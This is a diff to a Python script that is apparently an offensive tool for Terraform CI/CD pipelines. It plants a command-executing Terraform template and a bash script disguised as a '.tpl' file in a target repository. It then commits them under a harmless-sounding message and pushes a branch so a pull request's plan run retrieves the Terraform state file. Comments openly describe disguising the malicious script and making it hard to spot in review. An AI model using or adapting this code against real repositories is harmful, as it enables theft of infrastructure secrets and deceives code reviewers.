@@ -135,7 +135,34 @@ def apply_on_plan(tmp_folder, terraform_folder):
     return url_pr
 
 def get_state_file(tmp_folder, terraform_folder):
-    return exec_command(tmp_folder, terraform_folder, "cat .terraform/terraform.tfstate")
+    # Copying template to execute a command
+    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
+    # We use a name that is generic but unique
+    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance002.tf")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+    
+    s = Template(open(dst_file, "r").read())
+    # The command we will run is a bash script
+    template_filled = s.substitute(command="bash instance.tpl")
+    open(dst_file, "w").write(template_filled)
+
+    # We add the bash script that performs the apply
+    # Pretend the malicious script is a .tpl file
+    src_file = os.path.join(SCRIPT_PATH, "templates/retrieve_state_file.sh")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "instance.tpl")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+
+    # We add the file performing the attack
+    print("[+] Commiting the template locally")
+    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance002.tf"))
+    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
+    output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
+    print("[+] Pushing apply_on_plan commit to origin")
+    output = subprocess.getoutput("git push origin " + TMP_BRANCH)
+    url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
+    return url_pr
 
 # To be a bit more sneaky we commit a couple times so it's not as easy to see the malicious code in the PR
 def rewrite_history(tmp_folder):
